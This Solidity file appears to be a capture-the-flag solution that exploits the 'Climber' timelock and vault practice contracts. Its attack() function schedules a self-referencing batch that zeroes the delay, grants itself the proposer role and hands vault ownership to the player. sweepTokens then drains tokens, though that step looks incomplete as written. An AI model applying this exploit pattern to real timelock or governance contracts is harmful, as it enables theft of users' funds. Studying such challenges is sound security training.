// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {ClimberTimelock} from "./ClimberTimelock.sol";
import {ClimberVault} from "./ClimberVault.sol";
import {PROPOSER_ROLE} from "./ClimberConstants.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ClimberAttack {

    address payable player;
    ClimberTimelock timelock;
    ClimberVault vault;
    
    constructor(address _timelock, address _vault, address _player) {
        timelock = ClimberTimelock(payable(_timelock));
        vault = ClimberVault(payable(_vault));
        player = payable(_player);
    }

    event TimestampUpdated(uint64 readyAtTimestamp,bool known, bool executed);

    function attack() external {
        bytes[] memory actions = new bytes[](4);
        uint256[] memory values = new uint256[](4);
        address[] memory targets = new address[](4);

        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(vault);
        targets[3] = address(this);

        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;

        actions[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        actions[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        actions[2] = abi.encodeWithSignature("transferOwnership(address)", player);
        actions[3] = abi.encodeWithSignature("attack()");

        timelock.schedule(targets, values, actions, "");
    }

    function sweepTokens(address token, address recovery) external {
        vault.sweepFunds(token);
        IERC20(token).transfer(recovery, IERC20(token).balanceOf(address(this)));
    }
}